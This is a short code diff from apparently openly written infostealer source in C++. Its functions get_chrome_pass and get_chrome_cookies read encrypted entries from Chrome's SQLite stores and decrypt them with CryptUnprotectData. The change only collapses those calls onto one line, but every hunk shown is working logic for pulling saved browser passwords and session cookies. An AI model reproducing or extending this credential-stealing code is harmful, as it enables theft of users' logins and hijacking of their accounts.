@@ -30,14 +30,7 @@ stringstream get_chrome_pass(sqlite3* db)
 
         memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
 
-        CryptUnprotectData(
-                &encryptedPass,
-                NULL,
-                NULL,
-                NULL,
-                NULL,
-                0,
-                &decryptedPass);
+        CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
         if(decryptedPass.pbData==nullptr)
         {
             cerr<<"get_chrome_pass() error"<<endl;
@@ -88,14 +81,7 @@ stringstream get_chrome_cookies(sqlite3* db)
 
         memcpy(encryptedCookies.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedCookies.cbData);
 
-        CryptUnprotectData(
-                &encryptedCookies,
-                NULL,
-                NULL,
-                NULL,
-                NULL,
-                0,
-                &decryptedCookies);
+        CryptUnprotectData(&encryptedCookies, NULL, NULL, NULL, NULL, 0, &decryptedCookies);
         if(decryptedCookies.pbData==nullptr)
         {
             cerr<<"get_chrome_cookies() error"<<endl;
